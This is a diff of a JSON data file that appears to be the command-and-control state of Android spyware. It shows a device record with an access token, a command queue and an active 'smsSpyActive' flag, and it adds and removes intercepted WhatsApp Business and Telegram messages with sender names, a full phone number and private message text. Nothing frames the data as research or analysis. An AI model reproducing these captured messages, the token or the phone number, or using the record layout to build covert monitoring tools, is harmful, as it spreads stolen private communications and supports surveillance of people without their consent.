@@ -303,7 +303,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775638974898,
+    "lastSeen": 1775638996102,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -319,6 +319,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "Bug",
+        "content": "Telepon suara masuk",
+        "time": "08/04 16:03",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775638997518
+      },
+      {
+        "appName": "WA Business",
+        "sender": "Bug",
+        "content": "Telepon suara masuk",
+        "time": "08/04 16:03",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775638997060
+      },
       {
         "appName": "Telegram",
         "sender": "ㅤ ᴀ̈xᴇʟʟ",
@@ -4302,22 +4318,6 @@
         "time": "08/04 14:48",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775634508133
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 898-7564-441",
-        "content": "Ok sayang",
-        "time": "08/04 14:48",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775634504193
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 898-7564-441",
-        "content": "Ok sayang",
-        "time": "08/04 14:48",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775634504187
       }
     ],
     "galleryPhotos": [],
